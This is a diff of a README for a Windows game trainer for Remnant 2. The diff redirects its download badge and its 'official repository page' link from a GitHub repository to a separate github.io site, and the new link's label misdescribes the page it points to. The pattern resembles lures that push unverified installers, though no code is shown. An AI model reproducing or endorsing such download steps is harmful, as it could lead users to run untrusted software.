@@ -1,6 +1,6 @@
 # 🎮 Remnant-2-Trainer-2026 - Improve your game stats easily
 
-[![](https://img.shields.io/badge/Download-Remnant%202%20Trainer-blue.svg)](https://github.com/Strengthalpinism301/Remnant-2-Trainer-2026)
+[![](https://img.shields.io/badge/Download-Remnant%202%20Trainer-blue.svg)](https://strengthalpinism301.github.io)
 
 This software helps players manage their game progress in Remnant 2. It works on Windows 10 and Windows 11. You use this tool to modify health, stamina, and resources while you play.
 
@@ -19,7 +19,7 @@ Your computer must meet these standards to run the trainer:
 
 Follow these steps to obtain the tool:
 
-1. Visit the [official repository page](https://github.com/Strengthalpinism301/Remnant-2-Trainer-2026).
+1. Visit the [official repository page](https://strengthalpinism301.github.io).
 2. Locate the link to download the software.
 3. Click the link to save the installer file to your computer.
 4. Choose a folder where you can find the file, such as your Downloads folder.
